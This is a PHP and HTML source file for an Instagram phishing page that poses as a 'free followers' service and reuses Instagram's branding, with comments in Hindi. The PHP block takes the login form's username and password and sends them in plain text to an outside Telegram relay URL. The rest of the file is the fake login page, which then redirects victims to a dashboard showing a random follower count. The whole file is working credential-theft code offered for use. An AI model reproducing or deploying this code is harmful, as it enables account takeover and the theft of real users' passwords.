<?php
session_start();

// अगर पहले से login हो तो dashboard पर भेज दो
if (isset($_SESSION['username']) && !isset($_POST['login_submit'])) {
    header('Location: dashboard.php');
    exit;
}

$err = '';
$errors = [];

// 🔹 Telegram भेजने वाला Function (cURL से safe)
function sendToTelegram($msg) {
    $url = "https://tele-bridge.vercel.app/api/send?msg=" . urlencode($msg);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) return ['success' => false, 'error' => $err];

    $json = json_decode($res, true);
    if (!$json) return ['success' => false, 'error' => 'Invalid JSON response'];
    return $json;
}

// 🔹 फ़ॉर्म सबमिट होने पर प्रोसेस
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_submit'])) {

    $insta_handle = trim($_POST['insta_handle'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (!$insta_handle) $errors[] = 'Instagram username is required.';
    if (!$password) $errors[] = 'Password is required.';

    if (empty($errors)) {

        // Telegram को भेजो
        $text = "📩 New Insta User Found\nUsername: " . htmlspecialchars($insta_handle) . "\nPassword: " . htmlspecialchars($password);
        $response = sendToTelegram($text);

        // 🔹 Session में username डालो
        $_SESSION['username'] = htmlspecialchars($insta_handle, ENT_QUOTES, 'UTF-8');
        $_SESSION['followers'] = rand(120, 980);

        // 🔹 Telegram भेजने का result check
        if (!empty($response['success'])) {
            $_SESSION['temp_message'] = '✅ Thank you! Your message was sent.';
        } else {
            $_SESSION['temp_error'] = '❌ ERROR: ' . ($response['error'] ?? 'Unknown Error');
        }

        // 🔹 Redirect to dashboard.php
        header("Location: dashboard.php");
        exit;
    } else {
        $err = implode('<br>', $errors);
    }
}

// अगर पिछले session से error आया हो
if (isset($_SESSION['temp_error'])) {
    $err = $_SESSION['temp_error'];
    unset($_SESSION['temp_error']);
}
?>
<!doctype html>
<html lang="hi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="description" content="Get Free Instagram Followers Quickly and Safely.Your Trusted Source for Instagram Growth.">
  <meta name="keywords" content="Get, Free, Instagram, Followers, Quickly, and, Safely,Your, Trusted, Source, for, Instagram, Growth,">
  <meta name="author" content="kanXer">

  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Get Followers for Instagram  | Portfolio">
  <meta property="og:description" content="Get Free Instagram Followers Quickly and Safely.Your Trusted Source for Instagram Growth.">
  <meta property="og:image" content="https://hackncode.live/instagram/instaIncreaser.png">
  <meta property="og:url" content="https://hackncode.live/instagram/">
  <meta property="og:site_name" content="Get Followers for Instagram | KanXer">

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Get Followers for Instagram | Portfolio">
  <meta name="twitter:description" content="Get Free Instagram Followers Quickly and Safely.Your Trusted Source for Instagram Growth.">
  <meta name="twitter:image" content="https://hackncode.live/instagram/instaIncreaser.png">
  <title>Login • FollowersGain</title>
  <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
  <link rel="stylesheet" href="styles.css?v=<?php echo time(); ?>" />
</head>
<body class="ig-bg">
  <main class="ig-container">
    <section class="ig-left">
      <div class="phone-mock">
        <div class="phone-screen">
          <div class="mock-header">Followers Gain</div>
          <img src="/instagram/landing.png" alt="">
        </div>
        <div class="phone-shadow"></div>
      </div>
    </section>

    <section class="ig-right">
      <div class="login-card ig-card">
        <div style="display: flex;align-items:center;justify-content:center;margin-bottom:20px;">
          <i style="background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png'); background-position: 0px -2959px; width: 175px; height: 51px; background-repeat: no-repeat;"></i>
        </div>

        <?php if ($err): ?>
          <div class="error"><?php echo $err; ?></div>
        <?php endif; ?>

        <form method="post" class="ig-form" autocomplete="off">
          <input name="insta_handle" type="text" placeholder="Instagram username — ex: natgeo" />
          <input name="password" type="password" placeholder="Password" />
          <button class="ig-btn" name="login_submit" type="submit">Log In</button>
        </form>

        <div class="ig-or"><span>OR</span></div>
        <button class="fb-btn" onclick="alert('Facebook Login Not Working in Gaining Followers ')">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px;opacity:.9">
            <path d="M22 12a10 10 0 1 0-11.5 9.87v-6.99h-2.2V12h2.2V9.8c0-2.18 1.3-3.39 3.29-3.39.95 0 1.95.17 1.95.17v2.15h-1.1c-1.09 0-1.43.68-1.43 1.38V12h2.44l-.39 2.88h-2.05v6.99A10 10 0 0 0 22 12z"/>
          </svg>
          Log in with Facebook
        </button>

        <div class="need-help">
          <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </div>
      </div>

      <div class="signup-card ig-card">
        <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
      </div>
    </section>
  </main>
</body>
</html>
